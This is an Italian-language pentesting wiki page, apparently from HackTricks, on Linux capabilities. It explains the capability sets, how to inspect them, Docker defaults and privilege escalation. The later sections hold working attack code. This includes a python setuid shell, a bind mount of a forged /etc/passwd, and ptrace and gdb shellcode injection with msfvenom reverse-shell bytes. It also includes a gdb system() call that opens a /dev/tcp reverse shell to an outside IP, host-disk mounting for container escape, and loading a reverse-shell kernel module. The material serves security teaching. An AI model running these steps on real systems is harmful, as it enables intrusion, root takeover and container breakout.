# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Le capabilities di Linux suddividono i **privilegi di root in unità più piccole e distinte**, consentendo ai processi di avere un sottoinsieme di privilegi. Questo riduce i rischi, evitando di concedere inutilmente privilegi root completi.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Il problema:

- Gli utenti normali dispongono di permessi limitati per operazioni come l'apertura di raw socket o il binding di porte Internet inferiori a 1024; le capabilities possono concedere solo l'operazione richiesta invece dell'intero privilegio root.<sup>[[14]](#references)</sup>

### Set di capabilities:

Linux espone questi set di capabilities per thread e il kernel applica i relativi vincoli quando un processo cambia le proprie credenziali o esegue un file.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Scopo**: identifica le capabilities che possono contribuire al set permitted dopo `execve()` quando il file eseguito dispone di file capabilities inheritable corrispondenti.
- **Funzionalità**: il set inheritable del thread viene preservato attraverso `execve()`; da solo non rende effettive tali capabilities.
- **Restrizioni**: l'aggiunta di una capability a questo set è vincolata dai set permitted e bounding.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Scopo**: rappresenta le capabilities effettivamente utilizzate da un processo in un determinato momento.
- **Funzionalità**: è il set di capabilities verificato dal kernel per concedere l'autorizzazione a diverse operazioni. Per i file, questo set può essere un flag che indica se le capabilities permitted del file devono essere considerate effective.
- **Importanza**: il set effective è fondamentale per i controlli immediati dei privilegi e agisce come set attivo delle capabilities che un processo può utilizzare.

3. **Permitted (CapPrm)**:

- **Scopo**: definisce il set massimo di capabilities che un processo può possedere.
- **Funzionalità**: un processo può elevare una capability dal set permitted al set effective, ottenendo la possibilità di utilizzarla. Può inoltre rimuovere capabilities dal proprio set permitted.
- **Limite**: se una capability viene rimossa da questo set, normalmente non può essere ripristinata senza eseguire un file che la conceda o senza un'altra transizione privilegiata.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Scopo**: limita le capabilities che un processo può ottenere da un file durante `execve()` e quelle che può aggiungere al proprio set inheritable.
- **Funzionalità**: il set viene ereditato attraverso `fork()` e preservato attraverso `execve()`; le capabilities possono essere rimosse da esso quando il chiamante dispone di `CAP_SETPCAP`.
- **Caso d'uso**: rimuovere le capabilities non necessarie da questo set limita l'acquisizione successiva di privilegi.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Scopo**: consente a capabilities selezionate di rimanere permitted ed effective attraverso `execve()` di un programma non privilegiato.
- **Funzionalità**: le capabilities ambient vengono aggiunte ai nuovi set permitted ed effective quando il file eseguito non è privilegiato.
- **Restrizioni**: una capability può essere ambient solo quando è presente sia nei set permitted sia in quelli inheritable; l'esecuzione di un file set-user-ID/set-group-ID o di un file con capabilities cancella il set ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities di Processi e Binari

### Capabilities dei Processi

Per visualizzare le capabilities di un determinato processo, usa il file **status** nella directory /proc. Poiché fornisce maggiori dettagli, limitiamoci alle sole informazioni relative alle capabilities di Linux.\
Nota che per tutti i processi in esecuzione le informazioni sulle capabilities vengono mantenute per thread, mentre le file capabilities sono memorizzate negli attributi estesi `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Puoi trovare le capabilities definite in /usr/include/linux/capability.h

Puoi trovare le capabilities del processo corrente con `cat /proc/self/status` o con `capsh --print`, e quelle degli altri processi in `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Questo comando dovrebbe restituire cinque righe di capabilities sulla maggior parte dei sistemi.<sup>[[15]](#references)</sup>

- CapInh = capabilities ereditate
- CapPrm = capabilities consentite
- CapEff = capabilities effettive
- CapBnd = Bounding set
- CapAmb = set di capabilities ambientali
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Questi numeri esadecimali non hanno senso. Utilizzando l'utility `capsh`, possiamo decodificarli nei nomi delle capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Controlliamo ora le **capabilities** utilizzate da `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Sebbene funzioni, esiste un altro metodo più semplice. Per visualizzare le capabilities di un processo in esecuzione, usa lo strumento **getpcaps** seguito dal suo process ID (PID); accetta anche un elenco di process ID.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Verifichiamo le capabilities di `tcpdump` dopo aver assegnato al binario `cap_net_admin` e `cap_net_raw` per sniffare la rete (`tcpdump` è in esecuzione nel processo 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Come puoi vedere, le capabilities corrispondono ai risultati dei due metodi di ispezione di un processo. Il tool `getpcaps` utilizza libcap per interrogare le capabilities di un processo target e le stampa in formato testuale; accetta uno o più PID.<sup>[[22]](#references)</sup>

### Capabilities dei binari

I binari possono avere file capabilities che vengono applicate durante l'esecuzione. Ad esempio, un binario `ping` può avere la capability `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Puoi **cercare i binari con capabilities** usando `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Rimozione delle capabilities con capsh

Se rimuoviamo `CAP_NET_RAW` dal bounding set attivo, un programma che richiede tale capability non dovrebbe più essere in grado di utilizzarla.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Oltre all'output di _capsh_ stesso, anche il comando _tcpdump_ dovrebbe generare un errore.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

L'errore mostra che `tcpdump` non può essere eseguito con la file capability richiesta dopo che `CAP_NET_RAW` è stata rimossa dal bounding set.

### Rimuovere le Capabilities

È possibile rimuovere le capabilities di un file con `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Linux non assegna direttamente le file capabilities a un utente di accesso, ma il modulo PAM `pam_cap` può impostare capabilities ereditabili per le sessioni autenticate utilizzando `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Ogni voce associa nomi o numeri di capability separati da virgole a uno o più nomi utente.<sup>[[17]](#references)</sup>
Esempio di file:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capabilities dell'ambiente

La compilazione del seguente programma consente di **avviare una shell bash all'interno di un ambiente che fornisce capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
All'interno della **bash eseguita dal binary ambient compilato**, è possibile osservare le **nuove capabilities** (un utente normale non avrà alcuna capability nella sezione "current").<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Puoi **aggiungere solo le capabilities presenti** sia nei set permitted che inheritable.<sup>[[14]](#references)</sup>

### Binaries capability-aware/capability-dumb

Un capability-dumb binary è un programma con file capabilities che non usa libcap per gestirle. Se il suo effective bit è impostato, il kernel abilita le file capabilities permitted nel set effective del processo; l'esecuzione può fallire se il processo non ha ottenuto tutte le capabilities permitted.<sup>[[14]](#references)</sup>

## Service Capabilities

Un system service eseguito come root può conservare capabilities estese, a meno che il suo execution environment non le limiti. In una systemd unit, `User=` seleziona l'utente del service e `AmbientCapabilities=` aggiunge le capabilities indicate al set ambient del processo eseguito.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities nei Docker Containers

Docker avvia i container con un set di capabilities predefinito, che può essere modificato con `--cap-add` e `--cap-drop`; un container di esempio può essere analizzato con `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Le capabilities sono utili quando **si desidera limitare i propri processi dopo aver eseguito operazioni privilegiate** (ad esempio, dopo aver configurato chroot e aver eseguito il binding a un socket). Tuttavia, possono essere sfruttate passando loro comandi o argomenti malevoli che vengono quindi eseguiti come root.<sup>[[2]](#references)</sup>

È possibile forzare le file capabilities sui programmi con `setcap` e interrogarle con `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Per la sintassi delle file capability, `+ep` aggiunge la capability indicata agli insiemi effective e permitted; `-` rimuove i flag selezionati.<sup>[[21]](#references)</sup>

Per identificare i programmi in un sistema o in una cartella che dispongono di capability, usa `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Esempio di exploitation

Nel seguente esempio, il binario `/usr/bin/python2.6` risulta vulnerabile alla privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** necessarie a `tcpdump` per **consentire a qualsiasi utente di sniffare pacchetti**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Il caso speciale delle capabilities "vuote"

Un file può avere un set di capabilities vuoto (`getcap myelf` restituisce `myelf =ep`). Un set vuoto non concede alcuna capability; se combinato con un bit set-user-ID appartenente a root, il programma può comunque modificare gli ID effective e saved del processo in esecuzione portandoli a 0, senza ottenere file capabilities. Un file non appartenente a root, senza SUID/SGID e con `=ep`, non viene eseguito come root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** è una Linux capability altamente potente, spesso considerata quasi equivalente al livello root a causa degli ampi **privilegi amministrativi** che offre, come il mounting dei device o la manipolazione delle funzionalità del kernel. Sebbene sia indispensabile per i container che simulano interi sistemi, **`CAP_SYS_ADMIN` pone significative sfide di sicurezza**, soprattutto negli ambienti containerizzati, a causa del suo potenziale per la privilege escalation e la compromissione del sistema. Pertanto, il suo utilizzo richiede valutazioni di sicurezza rigorose e una gestione prudente, preferendo fortemente il dropping di questa capability nei container specifici per le applicazioni, in conformità con il **principio del minimo privilegio** e per ridurre al minimo la attack surface.<sup>[[14]](#references)</sup>

Per i namespace pivots, l'ambito è importante: `setns()` verifica `CAP_SYS_ADMIN` rispetto allo user namespace proprietario del target. L'accesso a un mount namespace richiede inoltre `CAP_SYS_CHROOT` nello user namespace del caller. Una capability posseduta solo all'interno di uno user namespace privato rimappato non concede quindi l'accesso arbitrario ai namespace iniziali dell'host.<sup>[[14]](#references)</sup>

**Esempio con binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Usando Python puoi montare un file _passwd_ modificato sopra il file _passwd_ reale:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
E infine **monta** il file `passwd` modificato su `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
E sarai in grado di eseguire **`su` come root** utilizzando la password "password".

**Esempio con environment (Docker breakout)**

Puoi verificare le capabilities abilitate all'interno del container Docker utilizzando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Nel precedente output puoi vedere che la capability SYS_ADMIN è abilitata.<sup>[[14]](#references)</sup>

- **Mount**

Con un accesso adeguato ai device e ai namespace, ciò può consentire a un Docker container di **montare un disco dell'host e accedere ai relativi contenuti**. Il device node deve rappresentare un device reale dell'host, il device cgroup deve consentirlo e il mount di un filesystem basato su blocchi richiede `CAP_SYS_ADMIN` nell'user namespace iniziale.<sup>[[14]](#references)</sup>
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```
- **Accesso completo**

Nel metodo precedente siamo riusciti ad accedere al disco di un host.\
Se l'host esegue un server **ssh**, potresti **creare un utente all'interno del disco montato** e accedervi tramite SSH.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```
Letture e scritture dirette sotto `/mnt/host` costituiscono già accesso al filesystem dell'host. Il `chroot` finale è solo una comodità per i pathname e richiede inoltre `CAP_SYS_CHROOT`; non è il passaggio che crea l'escape.

## CAP_SYS_PTRACE

Con `CAP_SYS_PTRACE`, un processo può tracciare e ispezionare altri processi visibili nel proprio PID namespace. Per eseguire il targeting dei processi dell'host da un container Docker, condividi il PID namespace dell'host con `--pid=host` (oppure unisciti a un namespace contenente il target).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** concede la possibilità di utilizzare le funzionalità di debugging e system call tracing fornite da `ptrace(2)` e da chiamate cross-memory attach come `process_vm_readv(2)` e `process_vm_writev(2)`. Sebbene sia potente per scopi diagnostici e di monitoring, se `CAP_SYS_PTRACE` è abilitato senza misure restrittive come un filtro seccomp su `ptrace(2)`, può compromettere significativamente la sicurezza del sistema. In particolare, può essere sfruttato per aggirare altre restrizioni di sicurezza, soprattutto quelle imposte da seccomp, come dimostrato da [proofs of concept (PoC) come questo](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Esempio con binario (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Esempio con binario (gdb)**

`gdb` con la capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Creare uno shellcode con msfvenom da iniettare in memoria tramite gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Esegui il debug di un processo root con gdb e copia-incolla le righe di gdb generate in precedenza:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Esempio con environment (Docker breakout) - Un altro Abuse di gdb**

Se **GDB** è installato (oppure puoi installarlo, ad esempio, con `apk add gdb` o `apt install gdb`), puoi fare il **debug di un processo host visibile** e fargli chiamare la funzione `system`. Sono necessari `CAP_SYS_PTRACE` effettivi nel namespace utente target e la visibilità dei PID dell'host; non è richiesto `CAP_SYS_ADMIN`. Yama, lo stato non dumpable, seccomp e i criteri LSM possono comunque bloccare l'attach.
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Non potrai vedere l'output del comando eseguito, ma verrà eseguito da quel processo (quindi ottieni una rev shell).

> [!WARNING]
> Se ricevi l'errore "No symbol "system" in current context.", controlla l'esempio precedente sul caricamento di una shellcode in un programma tramite gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

Puoi verificare le capabilities abilitate all'interno del container Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Elenca i **processi** in esecuzione nell'**host** `ps -eaf`

1. Recupera l'**architettura** `uname -m`
2. Trova una **shellcode** per l'architettura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Trova un **programma** per **inject** la **shellcode** nella memoria di un processo ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modifica** la **shellcode** all'interno del programma e **compilalo** `gcc inject.c -o inject`
5. **Inject** la shellcode e ottieni la tua **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** consente a un processo di **caricare e scaricare moduli del kernel (le system call `init_module(2)`, `finit_module(2)` e `delete_module(2)`)**, offrendo accesso diretto alle operazioni fondamentali del kernel. Questa capability presenta rischi critici per la sicurezza, perché il caricamento di un modulo può modificare il comportamento del kernel e potrebbe compromettere i confini di isolamento.<sup>[[6]](#references)[[14]](#references)</sup>
In un normale container Linux rootful, questo prende di mira il **kernel condiviso dell'host** e costituisce quindi un breakout diretto. La capability deve essere effettiva nell'initial user namespace, perché il caricamento dei moduli non è namespaced. Un userspace-kernel o un runtime isolato tramite VM come gVisor, Kata o Hyper-V modifica il confine del kernel raggiungibile. Il caricamento dei moduli può comunque essere bloccato da `modules_disabled`, dal kernel lockdown, dall'enforcement delle firme, da seccomp o da un LSM.<sup>[[14]](#references)</sup>

**Esempio con binary**

Nel seguente esempio, il binary **`python`** dispone di questa capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Per impostazione predefinita, il comando **`modprobe`** verifica la presenza dei file di elenco delle dipendenze e dei file map nella directory **`/lib/modules/$(uname -r)`**.\
Per sfruttare questo comportamento, creiamo una cartella **lib/modules** falsa:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Quindi **compila il modulo del kernel: puoi trovare 2 esempi qui sotto, quindi copialo** in questa cartella:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Infine, esegui il codice Python necessario per caricare questo modulo del kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Esempio 2 con binary**

Nel seguente esempio il binary **`kmod`** dispone di questa capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
